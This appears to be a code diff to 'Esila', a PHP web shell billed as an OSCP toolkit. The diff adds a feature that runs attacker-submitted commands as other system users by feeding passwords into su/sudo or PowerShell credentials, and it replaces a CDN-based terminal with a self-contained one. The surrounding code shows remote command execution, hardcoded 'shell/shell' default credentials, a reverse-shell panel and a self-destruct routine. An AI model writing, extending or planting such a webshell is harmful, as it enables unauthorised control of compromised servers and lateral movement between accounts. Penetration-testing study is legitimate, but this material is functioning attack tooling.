@@ -14,7 +14,7 @@ if(!isset($_SESSION)){$_SESSION=array();}
 define('IS_WIN', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 define('DEFAULT_USER', 'shell');
 define('DEFAULT_PASS', 'shell');
-define('VERSION', '2.1');
+define('VERSION', '2.2');
 
 // Universal command execution - tries multiple methods
 function esila_exec($cmd) {
@@ -213,6 +213,35 @@ if (isset($_POST['autocomplete'])) {
     exit;
 }
 
+// Switch user
+if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
+    header('Content-Type: application/json');
+    $su_user = isset($_POST['su_user']) ? trim($_POST['su_user']) : '';
+    $su_pass = isset($_POST['su_pass']) ? $_POST['su_pass'] : '';
+    if ($su_user === '') {
+        unset($_SESSION['su_user'], $_SESSION['su_pass']);
+        echo json_encode(array('ok' => true, 'msg' => 'Switched back to default user', 'user' => trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null'))));
+        exit;
+    }
+    if (IS_WIN) {
+        $test = esila_exec('powershell -c "$p=ConvertTo-SecureString ' . escapeshellarg($su_pass) . ' -AsPlainText -Force;$c=New-Object System.Management.Automation.PSCredential(' . escapeshellarg($su_user) . ',$p);Start-Process cmd -Credential $c -ArgumentList \'/c whoami\' -NoNewWindow -Wait -RedirectStandardOutput C:\\Windows\\Temp\\esila_su.txt 2>&1;Get-Content C:\\Windows\\Temp\\esila_su.txt;Remove-Item C:\\Windows\\Temp\\esila_su.txt -Force" 2>&1');
+    } else {
+        $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | su - ' . escapeshellarg($su_user) . ' -c "whoami" 2>&1');
+        if (strpos($test, $su_user) === false) {
+            $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' whoami 2>&1');
+        }
+    }
+    $test = trim($test);
+    if (strpos($test, $su_user) !== false || strpos($test, strtolower($su_user)) !== false) {
+        $_SESSION['su_user'] = $su_user;
+        $_SESSION['su_pass'] = $su_pass;
+        echo json_encode(array('ok' => true, 'msg' => 'Switched to ' . $su_user, 'user' => $su_user));
+    } else {
+        echo json_encode(array('ok' => false, 'msg' => 'Failed: ' . $test, 'user' => ''));
+    }
+    exit;
+}
+
 // Command execution
 if (isset($_POST['cmd'])) {
     $cmd = trim($_POST['cmd']);
@@ -231,10 +260,22 @@ if (isset($_POST['cmd'])) {
         }
         exit;
     }
+    // Build exec command with optional user context
+    $su_user = isset($_SESSION['su_user']) ? $_SESSION['su_user'] : '';
+    $su_pass = isset($_SESSION['su_pass']) ? $_SESSION['su_pass'] : '';
     if (IS_WIN) {
-        $exec = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+        $basecmd = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
     } else {
-        $exec = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+        $basecmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+    }
+    if ($su_user !== '') {
+        if (IS_WIN) {
+            $exec = 'powershell -c "$p=ConvertTo-SecureString ' . escapeshellarg($su_pass) . ' -AsPlainText -Force;$c=New-Object System.Management.Automation.PSCredential(' . escapeshellarg($su_user) . ',$p);Start-Process cmd -Credential $c -ArgumentList \'/c ' . addslashes($basecmd) . '\' -NoNewWindow -Wait -RedirectStandardOutput C:\\Windows\\Temp\\esila_out.txt -RedirectStandardError C:\\Windows\\Temp\\esila_err.txt;Get-Content C:\\Windows\\Temp\\esila_out.txt,C:\\Windows\\Temp\\esila_err.txt;Remove-Item C:\\Windows\\Temp\\esila_out.txt,C:\\Windows\\Temp\\esila_err.txt -Force -ErrorAction SilentlyContinue" 2>&1';
+        } else {
+            $exec = 'echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' bash -c ' . escapeshellarg($basecmd) . ' 2>&1';
+        }
+    } else {
+        $exec = $basecmd;
     }
     echo esila_exec($exec);
     exit;
@@ -433,7 +474,6 @@ $history = $_SESSION['history'];
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
 <title>Esila - <?= htmlspecialchars($hostname) ?></title>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css">
 <style>
 :root {
     --bg: #0d1117;
@@ -553,8 +593,14 @@ select.input { cursor:pointer; }
 .tab.active { color:var(--accent); background:var(--surface-solid); border-color:var(--border); }
 
 /* Terminal panel */
-#terminal-container { flex:1; padding:0; overflow:hidden; background:#010409; }
-#terminal-container .xterm { height:100%; }
+#terminal-container { flex:1; display:flex; flex-direction:column; overflow:hidden; background:#010409; }
+#term-output { flex:1; padding:12px 14px; font-family:var(--font-mono); font-size:14px; line-height:1.5; color:#e6edf3; overflow-y:auto; white-space:pre-wrap; word-break:break-all; cursor:text; }
+#term-output .prompt-user { color:#007AFF; font-weight:bold; }
+#term-output .prompt-host { color:#bc8cff; font-weight:bold; }
+#term-output .prompt-path { color:#3fb950; font-weight:bold; }
+#term-input-line { display:flex; align-items:center; padding:0 14px 10px; background:#010409; font-family:var(--font-mono); font-size:14px; gap:0; flex-shrink:0; }
+#term-input-line .prompt-static { white-space:nowrap; }
+#term-input { flex:1; background:transparent; border:none; outline:none; color:#e6edf3; font-family:var(--font-mono); font-size:14px; caret-color:#007AFF; padding:0; margin:0; }
 
 /* Scrollable panel content */
 .panel-body { flex:1; overflow-y:auto; padding:20px; }
@@ -707,7 +753,13 @@ select.input { cursor:pointer; }
         <div class="spacer"></div>
         <button class="btn btn-sm" onclick="termClear()">Clear</button>
     </div>
-    <div id="terminal-container"></div>
+    <div id="terminal-container">
+        <div id="term-output" onclick="document.getElementById('term-input').focus()"></div>
+        <div id="term-input-line">
+            <span class="prompt-static"><span class="prompt-user"><?= htmlspecialchars($username) ?></span>@<span class="prompt-host"><?= htmlspecialchars($hostname) ?></span>:<span class="prompt-path" id="term-prompt-path"><?= htmlspecialchars($cwd) ?></span>$ </span>
+            <input type="text" id="term-input" autofocus autocomplete="off" spellcheck="false">
+        </div>
+    </div>
 </div>
 
 <!-- ========== REVERSE SHELLS ========== -->
@@ -864,6 +916,20 @@ select.input { cursor:pointer; }
                 <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">PHP version: <?= phpversion() ?></p>
                 <a href="?logout" class="btn btn-danger" style="text-decoration:none;display:inline-block;margin-top:8px">Logout</a>
             </div>
+            <div class="card" style="border-color:rgba(0,122,255,0.3)">
+                <h3 style="margin-bottom:16px;color:#007AFF">Switch User</h3>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px">Execute commands as another user. Uses sudo/su on Linux, PowerShell credentials on Windows.</p>
+                <p style="font-size:13px;color:var(--text-secondary);margin-bottom:4px">Current: <span id="su-current" style="color:var(--green);font-weight:600"><?= htmlspecialchars(isset($_SESSION['su_user']) && $_SESSION['su_user'] ? $_SESSION['su_user'] : trim(esila_exec(IS_WIN ? 'whoami 2>nul' : 'whoami 2>/dev/null'))) ?></span></p>
+                <div style="display:flex;flex-direction:column;gap:8px;margin-top:12px">
+                    <input class="input input-sm" id="su-username" type="text" placeholder="Username" autocomplete="off">
+                    <input class="input input-sm" id="su-password" type="password" placeholder="Password" autocomplete="off">
+                    <div style="display:flex;gap:8px">
+                        <button class="btn btn-primary btn-sm" onclick="doSwitchUser()">Switch User</button>
+                        <button class="btn btn-sm" onclick="doResetUser()">Reset to Default</button>
+                    </div>
+                    <p id="su-status" style="font-size:12px;color:var(--text-secondary);margin:0"></p>
+                </div>
+            </div>
             <div class="card">
                 <h3 style="margin-bottom:16px">Environment</h3>
                 <?php
@@ -913,12 +979,7 @@ select.input { cursor:pointer; }
 <!-- Toast -->
 <div class="toast" id="toast"></div>
 
-<!-- xterm.js with CDN fallback -->
-<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js" onerror="window._xtermFailed=true"></script>
-<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js" onerror="window._xtermFitFailed=true"></script>
-
 <script>
-var XTERM_AVAILABLE = (typeof Terminal !== 'undefined' && !window._xtermFailed);
 // ===== GLOBALS =====
 const USERNAME = <?= json_encode($username) ?>;
 const HOSTNAME = <?= json_encode($hostname) ?>;
@@ -957,7 +1018,7 @@ async function apiText(data) { return (await api(data)).text(); }
 function formatPath(p) { return p === HOME ? '~' : ((p.startsWith(HOME + '/') || p.startsWith(HOME + '\\')) ? '~' + p.substring(HOME.length) : p); }
 
 // ===== SIDEBAR =====
-function toggleSidebar() { $('sidebar').classList.toggle('collapsed'); if(XTERM_AVAILABLE) setTimeout(function(){ fit.fit(); }, 300); }
+function toggleSidebar() { $('sidebar').classList.toggle('collapsed'); }
 function toggleMobileSidebar() { $('sidebar').classList.toggle('mobile-open'); $('mobileOverlay').classList.toggle('show'); }
 
 // ===== PANEL SWITCHING =====
@@ -965,136 +1026,106 @@ function switchPanel(name) {
     document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
     document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
     $('panel-' + name).classList.add('active');
-    document.querySelector(`.nav-item[data-panel="${name}"]`).classList.add('active');
-    if (name === 'terminal' && XTERM_AVAILABLE) setTimeout(function(){ fit.fit(); }, 100);
+    document.querySelector('[data-panel="' + name + '"]').classList.add('active');
+    if (name === 'terminal') setTimeout(function(){ $('term-input').focus(); }, 100);
     if (name === 'filemanager') loadFileManager(fmCurrentPath);
     $('mobileOverlay').classList.remove('show');
     $('sidebar').classList.remove('mobile-open');
 }
 
-// ===== TERMINAL (with CDN fallback) =====
-var term, fit;
+// ===== TERMINAL (pure inline, zero dependencies) =====
+var termOutput = $('term-output');
+var termInput = $('term-input');
+var termBusy = false;
+var suUser = '';
 
-function getPrompt() {
-    if (XTERM_AVAILABLE) {
-        return `\r\n\x1b[1;38;2;0;122;255m${USERNAME}\x1b[0m@\x1b[1;38;2;188;140;255m${HOSTNAME}\x1b[0m:\x1b[1;38;2;63;185;80m${formatPath(CWD)}\x1b[0m$ `;
-    }
-    return USERNAME + '@' + HOSTNAME + ':' + formatPath(CWD) + '$ ';
+function getPromptHtml() {
+    var u = suUser || USERNAME;
+    return '<span class="prompt-user">' + esc(u) + '</span>@<span class="prompt-host">' + esc(HOSTNAME) + '</span>:<span class="prompt-path">' + esc(formatPath(CWD)) + '</span>$ ';
 }
 
-if (XTERM_AVAILABLE) {
-    term = new Terminal({
-        cursorBlink: true, fontSize: 14, fontFamily: "'SF Mono','Fira Code','Cascadia Code',monospace",
-        theme: { background:'#010409', foreground:'#e6edf3', cursor:'#007AFF', selectionBackground:'rgba(0,122,255,0.3)', black:'#0d1117', red:'#f85149', green:'#3fb950', yellow:'#d29922', blue:'#79c0ff', magenta:'#bc8cff', cyan:'#56d4dd', white:'#e6edf3' },
-        convertEol: true, scrollback: 5000
-    });
-    fit = new FitAddon.FitAddon();
-    term.loadAddon(fit);
-    term.open($('terminal-container'));
-    setTimeout(function(){ fit.fit(); }, 50);
-    window.addEventListener('resize', function(){ fit.fit(); });
-    term.writeln('\x1b[1;38;2;0;122;255m  ___        _ _       \x1b[0m');
-    term.writeln('\x1b[1;38;2;0;122;255m | __|  ___ (_) | __ _ \x1b[0m');
-    term.writeln('\x1b[1;38;2;88;86;214m | _|  (_-< | | |/ _` |\x1b[0m');
-    term.writeln('\x1b[1;38;2;188;140;255m |___| /__/ |_|_|\\__,_|\x1b[0m');
-    term.writeln('\x1b[38;2;139;148;158m  Web Terminal v<?= VERSION ?> | OSCP Toolkit\x1b[0m');
-    term.write(getPrompt());
-
-    term.onData(function(e) {
-        switch (e) {
-            case '\t':
-                fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'autocomplete=' + encodeURIComponent(currentLine) })
-                .then(function(r){return r.text()}).then(function(data) {
-                    var opts = data.trim().split('\n').filter(Boolean);
-                    var lastWord = currentLine.split(/\s+/).pop();
-                    if (opts.length === 1) { var add = opts[0].substring(lastWord.length); currentLine += add; term.write(add); }
-                    else if (opts.length > 1) { term.write('\r\n' + opts.join('  ')); term.write(getPrompt() + currentLine); }
-                });
-                break;
-            case '\r':
-                if (!currentLine.trim()) { term.write(getPrompt()); currentLine = ''; return; }
-                var input = currentLine;
-                cmdHistory.push(input); historyIdx = cmdHistory.length;
-                if (input.trim() === 'clear') { term.clear(); term.write(getPrompt()); currentLine = ''; return; }
-                fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(input) })
-                .then(function(r){return r.text()}).then(function(out) {
-                    if (out.indexOf('__CWD__:') === 0) { CWD = out.replace('__CWD__:','').trim(); }
-                    else { term.write('\r\n' + out); }
-                    term.write(getPrompt());
-                });
-                currentLine = ''; break;
-            case '\u007F':
-                if (currentLine.length) { currentLine = currentLine.slice(0,-1); term.write('\b \b'); }
-                break;
-            case '\u001b[A':
-                if (historyIdx > 0) { historyIdx--; eraseLine(); currentLine = cmdHistory[historyIdx]; term.write(currentLine); }
-                break;
-            case '\u001b[B':
-                if (historyIdx < cmdHistory.length - 1) { historyIdx++; eraseLine(); currentLine = cmdHistory[historyIdx]; term.write(currentLine); }
-                else { eraseLine(); currentLine = ''; historyIdx = cmdHistory.length; }
-                break;
-            case '\u0003': term.write('^C'); currentLine = ''; term.write(getPrompt()); break;
-            case '\u000c': term.clear(); term.write(getPrompt()); currentLine = ''; break;
-            default:
-                if (e >= ' ') { currentLine += e; term.write(e); }
-        }
-    });
-} else {
-    // Fallback: plain textarea terminal when CDN is unreachable
-    var container = $('terminal-container');
-    container.innerHTML = '<style>#fallback-term{width:100%;height:100%;background:#010409;color:#e6edf3;font-family:monospace;font-size:14px;border:none;padding:12px;resize:none;outline:none;white-space:pre-wrap;overflow-y:auto}#fallback-input{width:100%;background:#0d1117;color:#3fb950;font-family:monospace;font-size:14px;border:none;border-top:1px solid rgba(255,255,255,0.08);padding:8px 12px;outline:none}</style>' +
-        '<textarea id="fallback-term" readonly></textarea>' +
-        '<input id="fallback-input" type="text" placeholder="Type command..." autofocus>';
-    var fbTerm = $('fallback-term');
-    var fbInput = $('fallback-input');
-    fbTerm.value = '  Esila Web Terminal v<?= VERSION ?> | OSCP Toolkit\n  (Fallback mode - no internet/CDN)\n\n' + getPrompt();
-    term = {
-        write: function(s) { fbTerm.value += s.replace(/\x1b\[[0-9;]*m/g,''); fbTerm.scrollTop = fbTerm.scrollHeight; },
-        writeln: function(s) { this.write(s + '\n'); },
-        clear: function() { fbTerm.value = ''; }
-    };
-    fit = { fit: function(){} };
-    fbInput.addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') {
-            var cmd = fbInput.value.trim();
-            fbInput.value = '';
-            if (!cmd) { fbTerm.value += '\n' + getPrompt(); return; }
-            cmdHistory.push(cmd); historyIdx = cmdHistory.length;
-            fbTerm.value += cmd + '\n';
-            if (cmd === 'clear') { fbTerm.value = getPrompt(); return; }
-            fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(cmd) })
-            .then(function(r){return r.text()}).then(function(out) {
-                if (out.indexOf('__CWD__:') === 0) { CWD = out.replace('__CWD__:','').trim(); }
-                else { fbTerm.value += out + '\n'; }
-                fbTerm.value += getPrompt();
-                fbTerm.scrollTop = fbTerm.scrollHeight;
-            });
-        } else if (e.key === 'ArrowUp') {
-            e.preventDefault();
-            if (historyIdx > 0) { historyIdx--; fbInput.value = cmdHistory[historyIdx]; }
-        } else if (e.key === 'ArrowDown') {
-            e.preventDefault();
-            if (historyIdx < cmdHistory.length - 1) { historyIdx++; fbInput.value = cmdHistory[historyIdx]; }
-            else { fbInput.value = ''; historyIdx = cmdHistory.length; }
-        }
-    });
+function updateInputPrompt() {
+    var u = suUser || USERNAME;
+    var ps = document.querySelector('#term-input-line .prompt-static');
+    if (ps) ps.innerHTML = '<span class="prompt-user">' + esc(u) + '</span>@<span class="prompt-host">' + esc(HOSTNAME) + '</span>:<span class="prompt-path" id="term-prompt-path">' + esc(formatPath(CWD)) + '</span>$ ';
 }
 
-function eraseLine() { if (XTERM_AVAILABLE) { for (var i = 0; i < currentLine.length; i++) term.write('\b \b'); } }
-function termClear() { term.clear(); if (XTERM_AVAILABLE) term.write(getPrompt()); else $('fallback-term').value = getPrompt(); currentLine = ''; }
-function termExec(cmd) {
-    switchPanel('terminal');
-    if (XTERM_AVAILABLE) {
-        currentLine = cmd; term.write(cmd);
-    }
+function termWrite(html) {
+    termOutput.innerHTML += html;
+    termOutput.scrollTop = termOutput.scrollHeight;
+}
+function termWriteLine(html) { termWrite(html + '\n'); }
+
+// Banner
+termWriteLine('<span style="color:#007AFF;font-weight:bold">  ___        _ _       </span>');
+termWriteLine('<span style="color:#007AFF;font-weight:bold"> | __|  ___ (_) | __ _ </span>');
+termWriteLine('<span style="color:#5856D6;font-weight:bold"> | _|  (_-&lt; | | |/ _` |</span>');
+termWriteLine('<span style="color:#bc8cff;font-weight:bold"> |___| /__/ |_|_|\\__,_|</span>');
+termWriteLine('<span style="color:#8b949e">  Web Terminal v<?= VERSION ?> | OSCP Toolkit</span>');
+termWriteLine('');
+
+function runCommand(cmd) {
+    if (!cmd.trim()) return;
+    termBusy = true;
+    cmdHistory.push(cmd); historyIdx = cmdHistory.length;
+    termWrite(getPromptHtml() + esc(cmd) + '\n');
+    if (cmd.trim() === 'clear') { termOutput.innerHTML = ''; termBusy = false; return; }
     fetch(window.location.href, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'cmd=' + encodeURIComponent(cmd)})
     .then(function(r){return r.text()}).then(function(out) {
-        if (out.indexOf('__CWD__:') === 0) CWD = out.replace('__CWD__:','').trim();
-        else term.write('\r\n' + out);
-        if (XTERM_AVAILABLE) term.write(getPrompt());
-        else { $('fallback-term').value += getPrompt(); $('fallback-term').scrollTop = $('fallback-term').scrollHeight; }
+        if (out.indexOf('__CWD__:') === 0) {
+            CWD = out.replace('__CWD__:','').trim();
+            updateInputPrompt();
+        } else {
+            termWrite(esc(out) + (out.endsWith('\n') ? '' : '\n'));
+        }
+        termBusy = false;
+    }).catch(function(err) {
+        termWriteLine('<span style="color:#f85149">Error: ' + esc(err.message) + '</span>');
+        termBusy = false;
     });
-    currentLine = '';
+}
+
+termInput.addEventListener('keydown', function(e) {
+    if (e.key === 'Enter') {
+        e.preventDefault();
+        var cmd = termInput.value;
+        termInput.value = '';
+        runCommand(cmd);
+    } else if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (historyIdx > 0) { historyIdx--; termInput.value = cmdHistory[historyIdx]; }
+    } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (historyIdx < cmdHistory.length - 1) { historyIdx++; termInput.value = cmdHistory[historyIdx]; }
+        else { termInput.value = ''; historyIdx = cmdHistory.length; }
+    } else if (e.key === 'Tab') {
+        e.preventDefault();
+        var partial = termInput.value;
+        fetch(window.location.href, { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:'autocomplete=' + encodeURIComponent(partial) })
+        .then(function(r){return r.text()}).then(function(data) {
+            var opts = data.trim().split('\n').filter(Boolean);
+            var lastWord = partial.split(/\s+/).pop();
+            if (opts.length === 1) {
+                termInput.value = partial + opts[0].substring(lastWord.length);
+            } else if (opts.length > 1) {
+                termWrite(getPromptHtml() + esc(partial) + '\n');
+                termWriteLine(esc(opts.join('  ')));
+            }
+        });
+    } else if (e.key === 'c' && e.ctrlKey) {
+        e.preventDefault();
+        termWrite(getPromptHtml() + esc(termInput.value) + '^C\n');
+        termInput.value = '';
+    } else if (e.key === 'l' && e.ctrlKey) {
+        e.preventDefault();
+        termOutput.innerHTML = '';
+    }
+});
+
+function termClear() { termOutput.innerHTML = ''; termInput.value = ''; }
+function termExec(cmd) {
+    switchPanel('terminal');
+    runCommand(cmd);
 }
 
 // ===== REVERSE SHELL DATA =====
@@ -1440,6 +1471,44 @@ async function runNet(tool) {
     $('net-output').textContent = data.result || 'No output';
 }
 
+// ===== USER SWITCH =====
+async function doSwitchUser() {
+    var user = $('su-username').value.trim();
+    var pass = $('su-password').value;
+    var status = $('su-status');
+    if (!user) { status.textContent = 'Enter a username.'; status.style.color = 'var(--red)'; return; }
+    status.textContent = 'Testing credentials...'; status.style.color = 'var(--text-secondary)';
+    try {
+        var data = await apiJson({action:'switch_user', su_user:user, su_pass:pass});
+        if (data.ok) {
+            status.textContent = 'Switched to ' + data.user; status.style.color = 'var(--green)';
+            $('su-current').textContent = data.user;
+            suUser = data.user;
+            updateInputPrompt();
+            termWriteLine('<span style="color:#3fb950">Switched to user: ' + esc(data.user) + '</span>');
+        } else {
+            status.textContent = data.msg || 'Failed'; status.style.color = 'var(--red)';
+        }
+    } catch(e) { status.textContent = 'Error: ' + e.message; status.style.color = 'var(--red)'; }
+}
+async function doResetUser() {
+    var status = $('su-status');
+    status.textContent = 'Resetting...'; status.style.color = 'var(--text-secondary)';
+    try {
+        var data = await apiJson({action:'switch_user', su_user:'', su_pass:''});
+        if (data.ok) {
+            status.textContent = 'Back to ' + data.user; status.style.color = 'var(--green)';
+            $('su-current').textContent = data.user;
+            suUser = '';
+            updateInputPrompt();
+            $('su-username').value = ''; $('su-password').value = '';
+            termWriteLine('<span style="color:#3fb950">Switched back to default user: ' + esc(data.user) + '</span>');
+        } else {
+            status.textContent = data.msg || 'Failed'; status.style.color = 'var(--red)';
+        }
+    } catch(e) { status.textContent = 'Error: ' + e.message; status.style.color = 'var(--red)'; }
+}
+
 // ===== SETTINGS =====
 async function selfDestruct() {
     if (!confirm('DANGER: This will permanently delete this webshell! Are you sure?')) return;
@@ -1456,10 +1525,9 @@ function updateClock() {
 }
 updateClock(); setInterval(updateClock, 1000);
 
-// Environment capabilities: update terminal mode indicator
 (function() {
     var el = $('env-terminal-mode');
-    if (el) el.textContent = XTERM_AVAILABLE ? 'xterm.js (full)' : 'Fallback (no CDN)';
+    if (el) el.textContent = 'Inline terminal (standalone)';
 })();
 
 // Update topbar path when CWD changes
@@ -1489,7 +1557,7 @@ renderGtfoGrid();
 
 // Update environment info card
 var envTermEl = $('env-terminal-mode');
-if (envTermEl) envTermEl.textContent = XTERM_AVAILABLE ? 'xterm.js (CDN loaded)' : 'Fallback textarea (no CDN)';
+if (envTermEl) envTermEl.textContent = 'Inline terminal (standalone)';
 </script>
 
 <!-- PHP detection for main app -->
